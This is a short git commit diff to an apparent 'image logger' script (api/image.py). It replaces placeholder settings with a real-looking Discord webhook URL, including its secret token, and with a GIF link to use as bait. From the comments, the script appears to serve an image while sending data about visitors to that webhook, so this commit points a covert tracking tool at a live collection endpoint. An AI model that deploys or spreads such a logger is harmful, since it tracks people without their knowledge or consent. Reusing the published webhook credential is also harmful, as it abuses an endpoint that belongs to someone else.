e3b512965642a1283f4bef143e153a39b3e889e9
senyou1120 <mekadyounes15@gmail.com>
2025-02-09 18:09:37 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1338194385786900514/0Rzdr-zh7KKcYgXqR1cJeCshaKtLzfbbnaSnMTLiFJaf44xgRqqz3IYUFVii8yAGnBUA",
+    "image": "https://motionbgs.com/media/1953/monkey-d-luffy-straw-hat_312.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
